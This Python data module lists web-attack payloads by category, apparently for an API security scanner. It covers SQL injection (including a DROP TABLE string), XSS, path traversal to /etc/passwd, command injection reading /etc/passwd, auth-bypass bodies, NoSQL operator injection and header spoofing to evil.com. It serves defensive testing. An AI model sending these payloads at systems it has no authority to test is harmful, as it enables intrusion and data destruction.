"""Security attack vector library — pure data.

Each category defines:
- ``target``: where the payload is injected (query / body / path / header)
- ``payloads``: the attack strings (or dicts for auth_bypass / header_injection)
- ``type_hint`` (optional): restricts injection to params of matching type
"""

SECURITY_VECTORS: dict[str, dict] = {
    "sql_injection": {
        "target": ["query", "body"],
        "payloads": [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin' --",
        ],
    },
    "xss": {
        "target": ["query", "body", "path"],
        "payloads": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "\"><script>alert(1)</script>",
        ],
    },
    "path_traversal": {
        "target": ["query", "body", "path"],
        "payloads": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
        ],
    },
    "command_injection": {
        "target": ["query", "body"],
        "payloads": [
            "; ls -la",
            "| cat /etc/passwd",
            "$(whoami)",
        ],
    },
    "auth_bypass": {
        "target": ["body"],
        "type_hint": "object",
        "payloads": [
            {"username": "admin", "password": ""},
            {},
            {"username": "admin' --", "password": "x"},
            {"token": ""},
            {"token": None},
        ],
    },
    "nosql_injection": {
        "target": ["body"],
        "type_hint": "json",
        "payloads": [
            '{"$gt": ""}',
            '{"$ne": null}',
            '{"$regex": ".*"}',
        ],
    },
    "header_injection": {
        "target": ["header"],
        "payloads": [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Forwarded-Host": "evil.com"},
        ],
    },
}
